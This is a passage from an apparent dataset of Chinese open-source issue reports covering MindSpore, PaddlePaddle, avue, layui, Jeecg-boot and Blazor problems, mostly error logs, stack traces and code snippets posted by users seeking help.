""/root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 98, in wrapper results = fn(*arg, **kwargs) File ""/root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 404, in __call__ phase = self.compile(args_list, self.fn.__name__) File ""/root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 378, in compile is_compile = self._graph_executor.compile(self.fn, compile_args, phase, True) NameError: The name 'ops' is not defined, or not supported in graph mode. ---------------------------------------------------- - The Traceback of Net Construct Code: ---------------------------------------------------- # In file &lt;doctest mindspore.ops.function.grad.grad_func.value_and_grad[13]&gt;(2) ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/pipeline/jit/parse/function_block.cc:309 HandleBuiltinNamespaceInfo"
Paddle多机分布式训练出错,"大家好！ root@3374a3140ee5:/app/ap/recognize_digits# PADDLE_TRAINING_ROLE=TRAINER PADDLE_PSERVER_IPS=ps0.paddlepaddle.com,ps1.paddlepaddle.com PADDLE_TRAINERS=2 PADDLE_TRAINER_ID=1 PADDLE_PSERVER_PORT=6174 python fluid_dist.py F0720 09:45:08.417428 591 grpc_client.cc:276] Send name:[fc_0.b_0@GRAD.trainer_1], ep:[ps1.paddlepaddle.com:6174] meets grpc error:Deadline Exceeded *** Check failure stack trace: *** @ 0x7f69cdad679d google::LogMessage::Fail() @ 0x7f69cdada24c google::LogMessage::SendToLog() @ 0x7f69cdad62c3 google::LogMessage::Flush() @ 0x7f69cdadb75e google::LogMessageFatal::~LogMessageFatal() @ 0x7f69ce2e16ef paddle::operators::distributed::GRPCClient::Proceed() @ 0x7f69d8856c80 (unknown) @ 0x7f6a198526ba start_thread @ 0x7f6a1958841d clone @ (nil) (unknown) Aborted (core dumped) 172.17.0.9 ps0.paddlepaddle.com 172.17.0.10 ps1.paddlepaddle.com 172.17.0.11 trainer0.paddlepaddle.com 172.17.0.12 trainer1.paddlepaddle.com   <code>: 这两天在尝试使用PaddlePaddle平台。之前按照操作说明单机训练可以有结果，但是进行多机训练时出错。 按照 http://www.paddlepaddle.org/docs/0.14.0/documentation/fluid/zh/new_docs/user_guides/howto/training/cluster_quick_start.html 这个文档进行的操作。 报错信息如下： 我是在docker里面进行操作的。 启用了4个docker实例，模拟4个主机。 /etc/hosts 里面配置如下： 4个docker实例可以互相访问，端口都打开着。 大家在多机训练时是怎么做的。有人遇到过类似的问题吗？希望得到高手指点，在此先谢过了！"
新版本异步校验问题,"在2.7.5版本中，只要一更改form表单的disabled状态，就会触发async-validator。而这些校验如果是向后台发送请求来进行验证的话，体验非常不好，在avue-cli中用的2.5.3版本就没有这个问题。以form-detail.vue这个文件做测试。控制台会打印出validator方法的内容   <code>: &lt;template&gt; &lt;basic-container&gt; &lt;h3&gt;{{$route.query.id?'编辑':'新增'}}&lt;/h3&gt; &lt;avue-form :option=""option"" v-model=""form""&gt; &lt;template slot=""menuForm""&gt; &lt;el-button icon=""el-icon-back"" @click=""handleBack()""&gt;返 回&lt;/el-button&gt; &lt;/template&gt; &lt;/avue-form&gt; &lt;/basic-container&gt; &lt;/template&gt; &lt;script&gt; export default { data () { let validateName = (rule, value, callback) =&gt; { console.log(value) callback() } return { form: {}, option: { disabled: true, labelWidth: 110, group: [{ column: [ { label: ""姓名"", prop: ""name"", rules: [ { required: true, message: '名称必填', trigger: 'blur', }, {validator: validateName, trigger: 'blur'} ], } ] }] } }; }, watch: { $route () { this.$message.success('路由更新id=' + this.$route.query.id) } }, methods: { handleBack () { // this.$router.$avueRouter.closeTag(); // this.$router.back(); this.option.disabled = (!this.option.disabled) } } }; &lt;/script&gt; &lt;style&gt; &lt;/style&gt;"
[CT][MS][OP] ApplyKerasMomentum has some problems at ascend,": Ascend /device ascend : -- MindSpore version : master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 检查ApplyKerasMomentum算子，doc资料 单个执行测试用例 连跑执行测试用例 doc资料中 use_nesterov 缺失默认值 Default: False 1，var、accum、grad,三者之间type描述不清 比如： var = float16，accum = float16，grad=float32 是否支持？ var = float32，accum = float16，grad=float16 是否支持？ var = float16，accum = float32，grad=float32 是否支持？ 2，lr、momentum ,type是否要求一致？ 比如： lr = float32, momentum=float16 是否支持？ lr = float16, momentum=float32 是否支持？ 3，var、accum、grad 和 lr、momentum，之间的type又是什么关系呢？ 谁与谁之间的 type 需要保持一致？ 参数说明，补充的更加详细；   <code>: Args: use_locking (bool): If `True`, updating of the `var` and `accum` tensors will be protected by a lock; Otherwise the behavior is undefined, but may exhibit less contention. Default: False. use_nesterov (bool): If `True`, the tensor passed to compute grad will be var + momentum * accum, so in the end, the var you get is actually var + momentum * accum. Inputs: - **var** (Parameter) - Variable to be updated. With float16 or float32 data type. - **accum** (Parameter) - Must have the same shape and type as `var`. With float16 or float32 data type. - **lr** (Union[Number, Tensor]) - Scaling factor. Must be a scalar. With float16 or float32 data type. - **grad** (Tensor) - The gradient. Must have the same shape and type as `var`. With float16 or float32 data type. - **momentum** (Union[Number, Tensor]) - Momentum. Must be a scalar. With float16 or float32 data type."
新增强制UrlEncoded的字符串模板,"新增强制UrlEncoded的字符串模板 其中不加$等任何前缀的花括号（）包裹的表达式表示为将被强制UrlEncoded的内容。 加上$符的花括号（）包裹的表达式的内容不被UrlEncoded。   <code>: @Get(""/info?lang={0}&amp;content={1}"") String getInfo(String lang, String content); {...} ${...}"
【开源】layui表单设计器 基于Sortable拖拽组件开发,"基于layui2.7RC5 Sortable拖拽组件开发的一款简洁易用，功能强大的表单设计器，其中除了包含layui自身常用的属性之外； 还包括级联选择器（城市）、富文本编辑器、TAGS标签(原创)等其他可用于生产环境下的优秀组件。熟悉layui即可轻松上手，开箱即用！ 增加了font-awesome图标库！ 为何又重新造了个轮子？因为外面的开源项目没有适合自己的，所以就从头搞了个！ 这个扩展发这里是因为，之前发在了layui官网扩展插件，只是好几天了，没有人审核，目前业务全线采用VUE做开发了， 做这个，也是为了那么点的情怀；发挥点余热！！！   <code>: //默认配置 Class.prototype.config = { id: null, data: [], // 当前元素集合 eval: '', // 当前HTML数据 count: 0, // 当前组件总数 state: null, // 当前活动实例 index: [], // 组件分类索引 itemIndex: {}, // 子组件元素索引 master: undefined // 主界面拖拽实例 }; layui.use(['form','jquery','flow','formDesign'],function() { var form = layui.form; var $ = layui.jquery; var formDesign = layui.formDesign; // 加载即可 formDesign.render({ elem: '#formBuilder' ,eval: '#formdesign' }); })"
启动报错Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled是因为jar包没导入全吗还是什么原因？,"版本号：   <code>: Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2022-01-04 15:43:52.103 [main] ERROR org.springframework.boot.SpringApplication:837 - Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'jimuReportTokenService': Unsatisfied dependency expressed through field 'sysBaseAPI'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sysBaseApiImpl': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sysLogMapper' defined in file [C:\IDEA Project\erptobs\jeecg-boot\jeecg-boot-module-system\target\classes\org\jeecg\modules\system\mapper\SysLogMapper.class]: Unsatisfied dependency expressed through bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.AbstractMethodError: javax.xml.parsers.DocumentBuilderFactory.setFeature(Ljava/lang/String;Z)V at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:643) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:130) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1420) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:593) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:897) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:879) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:551) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:143) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:758) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:750) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:405) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1237) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at org.jeecg.JeecgSystemApplication.main(JeecgSystemApplication.java:28) Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sysBaseApiImpl': Injection of resource dependencies failed; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sysLogMapper' defined in file [C:\IDEA Project\erptobs\jeecg-boot\jeecg-boot-module-system\target\classes\org\jeecg\modules\system\mapper\SysLogMapper.class]: Unsatisfied dependency expressed through bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.AbstractMethodError: javax.xml.parsers.DocumentBuilderFactory.setFeature(Ljava/lang/String;Z)V at org.springframework.context.annotation.CommonAnnotationBeanPostProcessor.postProcessProperties(CommonAnnotationBeanPostProcessor.java:321) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1420) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:593) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1307) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1227) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:640) ... 20 common frames omitted Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sysLogMapper' defined in file [C:\IDEA Project\erptobs\jeecg-boot\jeecg-boot-module-system\target\classes\org\jeecg\modules\system\mapper\SysLogMapper.class]: Unsatisfied dependency expressed through bean property 'sqlSessionFactory'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.AbstractMethodError: javax.xml.parsers.DocumentBuilderFactory.setFeature(Ljava/lang/String;Z)V at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireByType(AbstractAutowireCapableBeanFactory.java:1524) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1404) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:593) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:207) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.resolveBeanByName(AbstractAutowireCapableBeanFactory.java:453) at org.springframework.context.annotation.CommonAnnotationBeanPostProcessor.autowireResource(CommonAnnotationBeanPostProcessor.java:527) at org.springframework.context.annotation.CommonAnnotationBeanPostProcessor.getResource(CommonAnnotationBeanPostProcessor.java:497) at org.springframework.context.annotation.CommonAnnotationBeanPostProcessor$ResourceElement.getResourceToInject(CommonAnnotationBeanPostProcessor.java:650) at org.springframework.beans.factory.annotation.InjectionMetadata$InjectedElement.inject(InjectionMetadata.java:239) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:130) at org.springframework.context.annotation.CommonAnnotationBeanPostProcessor.postProcessProperties(CommonAnnotationBeanPostProcessor.java:318) ... 31 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sqlSessionFactory' defined in class path resource [com/baomidou/mybatisplus/autoconfigure/MybatisPlusAutoConfiguration.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.AbstractMethodError: javax.xml.parsers.DocumentBuilderFactory.setFeature(Ljava/lang/String;Z)V at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:655) at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:635) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1336) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1176) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:556) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:516) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:324) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:322) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1307) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1227) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireByType(AbstractAutowireCapableBeanFactory.java:1509) ... 45 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.apache.ibatis.session.SqlSessionFactory]: Factory method 'sqlSessionFactory' threw exception; nested exception is java.lang.AbstractMethodError: javax.xml.parsers.DocumentBuilderFactory.setFeature(Ljava/lang/String;Z)V at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:650) ... 58 common frames omitted Caused by: java.lang.AbstractMethodError: javax.xml.parsers.DocumentBuilderFactory.setFeature(Ljava/lang/String;Z)V at org.apache.ibatis.parsing.XPathParser.createDocument(XPathParser.java:234) at org.apache.ibatis.parsing.XPathParser.&lt;init&gt;(XPathParser.java:127) at org.apache.ibatis.builder.xml.XMLMapperBuilder.&lt;init&gt;(XMLMapperBuilder.java:81) at com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean.buildSqlSessionFactory(MybatisSqlSessionFactoryBean.java:592) at com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean.afterPropertiesSet(MybatisSqlSessionFactoryBean.java:431) at com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean.getObject(MybatisSqlSessionFactoryBean.java:628) at com.baomidou.mybatisplus.autoconfigure.MybatisPlusAutoConfiguration.sqlSessionFactory(MybatisPlusAutoConfiguration.java:219) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ... 59 common frames omitted Disconnected from the target VM, address: '127.0.0.1:2447', transport: 'socket' Process finished with exit code 1"
【MindSpore】【Ascend】【C类】【naml】在单卡训练时，出现报错，训练跑不通,"一、 问题描述： 在单卡训练时，出现报错，训练跑不通，报错信息如下： root@ef4e8a0b1615:/home/fdd/naml/script# bash run_train.sh Ascend 0 large /home/fdd/naml/MINDlarge Please run the script as: bash run_train.sh [PLATFORM] [DEVICE_ID] [DATASET] [DATASET_PATH] for example: bash run_train.sh Ascend 0 large /path/MINDlarge It is better to use absolute path. config path is : /home/fdd/naml/script/../MINDlarge_config.yaml Traceback (most recent call last): File ""/usr/local/lib/python3.7/dist-packages/sklearn/__check_build/init.py"", line 44, in from ._check_build import check_build # noqa ImportError: /usr/local/lib/python3.7/dist-packages/sklearn/__check_build/../../scikit_learn.libs/libgomp-d22c30c5.so.1.0.0: cannot allocate memory in static TLS block During handling of the above exception, another exception occurred: Traceback (most recent call last): File ""/home/fdd/naml/script/../train.py"", line 29, in from src.utils import process_data File ""/home/fdd/naml/src/utils.py"", line 18, in from sklearn.metrics import roc_auc_score File ""/usr/local/lib/python3.7/dist-packages/sklearn/init.py"", line 81, in from . import __check_build # noqa: F401 File ""/usr/local/lib/python3.7/dist-packages/sklearn/__check_build/init.py"", line 46, in raise_build_error(e) File ""/usr/local/lib/python3.7/dist-packages/sklearn/__check_build/init.py"", line 41, in raise_build_error %s"""""" % (e, local_dir, ''.join(dir_content).strip(), msg)) ImportError: /usr/local/lib/python3.7/dist-packages/sklearn/__check_build/../../scikit_learn.libs/libgomp-d22c30c5.so.1.0.0: cannot allocate memory in static TLS block Contents of /usr/local/lib/python3.7/dist-packages/sklearn/__check_build: init.py pycache _check_build.cpython-37m-aarch64-linux-gnu.so setup.py It seems that scikit-learn has not been built correctly. If you have installed scikit-learn from source, please do not forget to build the package before using it: run or in the source directory. If you have used an installer, please check that it is suited for your Python version, your operating system and your platform. Traceback (most recent call last): File ""/usr/local/lib/python3.7/dist-packages/sklearn/__check_build/init.py"", line 44, in from ._check_build import check_build # noqa ImportError: /usr/local/lib/python3.7/dist-packages/sklearn/__check_build/../../scikit_learn.libs/libgomp-d22c30c5.so.1.0.0: cannot allocate memory in static TLS block During handling of the above exception, another exception occurred: Traceback (most recent call last): File ""/home/fdd/naml/script/../eval.py"", line 23, in from src.utils import NAMLMetric, get_metric File ""/home/fdd/naml/src/utils.py"", line 18, in from sklearn.metrics import roc_auc_score File ""/usr/local/lib/python3.7/dist-packages/sklearn/init.py"", line 81, in from . import __check_build # noqa: F401 File ""/usr/local/lib/python3.7/dist-packages/sklearn/__check_build/init.py"", line 46, in raise_build_error(e) File ""/usr/local/lib/python3.7/dist-packages/sklearn/__check_build/init.py"", line 41, in raise_build_error %s"""""" % (e, local_dir, ''.join(dir_content).strip(), msg)) ImportError: /usr/local/lib/python3.7/dist-packages/sklearn/__check_build/../../scikit_learn.libs/libgomp-d22c30c5.so.1.0.0: cannot allocate memory in static TLS block Contents of /usr/local/lib/python3.7/dist-packages/sklearn/__check_build: init.py pycache _check_build.cpython-37m-aarch64-linux-gnu.so setup.py It seems that scikit-learn has not been built correctly. If you have installed scikit-learn from source, please do not forget to build the package before using it: run or in the source directory. If you have used an installer, please check that it is suited for your Python version, your operating system and your platform. root@ef4e8a0b1615:/home/fdd/naml/script# export LD_PRELOAD=$LD_PRELOAD:/usr/local/python3.7.5/lib/python3.7/site-packages/scikit_learn.libs/libgomp-d22c30c5.so.1.0.0 二、环境信息： -- CANN 版本: (CANN 5.0.2 B058) -- python 版本:Python 3.7.5 -- 操作系统版本:Ubuntu 18.04.5   <code>: python setup.py install make python setup.py install make"
跑deepFM模型里面的fm部分出现core,"- 问题 跑deepFM模型（https://github.com/PaddlePaddle/models/tree/develop/deep_fm）里面的fm部分，有时候会成功，有时候会出现core，并且有时候是在任务启动的开始就直接core掉，有时候是在任务跑到最后的时候core掉了，做了不同batch_size和num_passes的实验，具体结果如下： 最后两行的实验，都是在运行到最后的时候core掉了，请问是什么原因呢？ －代码 reader如下 network如下   <code>: import os import sys import cPickle feature_id_list = {2,18,30,37,38,39,40,43,44,47,48} class Dataset: def _reader_creator(self, dicts, path, is_infer): def reader(): slot_feature_dict = dicts['slot_feature_dict'] files = os.listdir(path) for fi in files: with open(path+ '/' + fi, ""r"") as f: UNK = '&lt;unk&gt;' for line in f: line_split = line.rstrip('\n').split('\t') if len(line_split) &lt; 60: continue label = [float(line_split[1])] sparse_feature = [] for i in range(2, len(line_split)): if i not in feature_id_list: continue slot_id = i-2 if line_split[i] == '': continue mini_seg_array = line_split[i].split('-') count = 0 for mini_seg in mini_seg_array: count = count + 1 #item_tag top6 if i == 30 or i == 48: if count &gt; 6: continue key = str(slot_id)+"":""+mini_seg if slot_feature_dict.has_key(key): sparse_feature.append(slot_feature_dict.get(key)) else: key = str(slot_id)+"":""+UNK if slot_feature_dict.has_key(key): sparse_feature.append(slot_feature_dict.get(key)) else: continue if not is_infer: yield [sparse_feature] + [label] else: yield [sparse_feature] return reader def train(self, dicts, path): return self._reader_creator(dicts, path, False) def test(self, dicts, path): return self._reader_creator(dicts, path, False) def infer(self, dicts, path): return self._reader_creator(dicts, path, True) if __name__ == ""__main__"": dict_path = sys.argv[1] train_path = sys.argv[2] slot_feature_dict_path = dict_path + ""/"" + ""slot_feature_dict.pkl"" with open(slot_feature_dict_path) as f: slot_feature_dict = cPickle.load(f) dicts = dict() dicts['slot_feature_dict'] = slot_feature_dict dataset = Dataset() for dat in dataset.train(dicts, train_path)(): print dat feeding = { 'sparse_input': 0, 'label': 1 } import paddle.v2 as paddle def fm_layer(input, factor_size, fm_param_attr): first_order = paddle.layer.fc( input=input, size=1, act=paddle.activation.Linear()) second_order = paddle.layer.factorization_machine( input=input, factor_size=factor_size, act=paddle.activation.Linear(), param_attr=fm_param_attr) out = paddle.layer.addto( input=[first_order, second_order], act=paddle.activation.Linear(), bias_attr=False) return out def DeepFM(factor_size, sparse_feature_dim, infer=False): sparse_input = paddle.layer.data( name=""sparse_input"", type=paddle.data_type.sparse_binary_vector(sparse_feature_dim)) sparse_fm = fm_layer( sparse_input, factor_size, fm_param_attr=paddle.attr.Param(name=""SparseFeatFactors"")) predict = paddle.layer.fc( input=sparse_fm, size=1, act=paddle.activation.Sigmoid()) if not infer: label = paddle.layer.data( name=""label"", type=paddle.data_type.dense_vector(1)) cost = paddle.layer.multi_binary_label_cross_entropy_cost( input=predict, label=label) paddle.evaluator.classification_error( name=""classification_error"", input=predict, label=label) paddle.evaluator.auc(name=""auc"", input=predict, label=label) return cost else: return predict"
Table的高级搜索自动生成的switch默认会传false值给后台,"数据库字段是bool类型 在页面上加入搜索 点击搜索，State会传false值给后台，这样查询出来的不是全部记录 我改了一下 默认不会传false过去了，但这样又无法解决我要查State为false的记录，只能用Select？   <code>: public bool State { get; set; } &lt;TableColumn @bind-Field=""@context.State"" Searchable=""true"" /&gt; public bool? State { get; set; } &lt;TableColumn @bind-Field=""@context.State"" Searchable=""true""&gt; &lt;SearchTemplate Context=""v""&gt; &lt;div class=""form-group col-12 col-sm-6""&gt; &lt;Checkbox ShowLabel=""true"" @bind-Value=""(v as Student)!.State"" /&gt; &lt;/div&gt; &lt;/SearchTemplate&gt; &lt;/TableColumn&gt;"
【高校贡献-MindSore模型训练】TransGAN需求fake_bp算子实现,"算子缺失 Hardware Environment(/): gpu Ascend : -- MindSpore version : 1.5.0 -- Python version : 3.7.5 -- OS platform and distribution : Ubuntu 18.04 -- GCC/Compiler version : 7.5.0 在GPU和Ascend上训练TransGAN时，使用WGAN的WGANGPGradientPenalty算法计算Loss时，会出现不支持的报错。asend上的完整报错信息如下：   <code>: fake_bprop sh-4.4$python train.py --data_url obs://s4plus-gaming/cifar-10-batches-bin/ --train_url obs://s4plus-gaming/TransGAN_for_modelarts/output/ INFO:root:Using MoXing-v2.0.0.rc2.4b57a67b-4b57a67b INFO:root:Using OBS-Python-SDK-3.20.9.1 mkdir: cannot create directory ‘samples’: File exists Download data. Starting Training Loop... [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.191.114 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Cast]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.191.220 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Cast]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.465.212 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Cast]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.465.254 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Cast]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.614.617 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:493] SelectKernelInfo] The node [kernel_graph_3:[CNode]4{[0]: ValueNode&lt;PrimitivePy&gt; Cast, [1]: [Parameter]5}] cannot find valid TBE kernel info, try to get aicpu kernel info [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.656.422 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.656.464 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.819.501 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.819.543 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.819.559 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.819.574 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.819.588 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.819.602 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.819.616 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:284] TagRaiseReduce] node:[Add]reduce precision from int64 to int32 [WARNING] DEVICE(118751,fffea17f41e0,python):2021-11-03-09:25:54.931.505 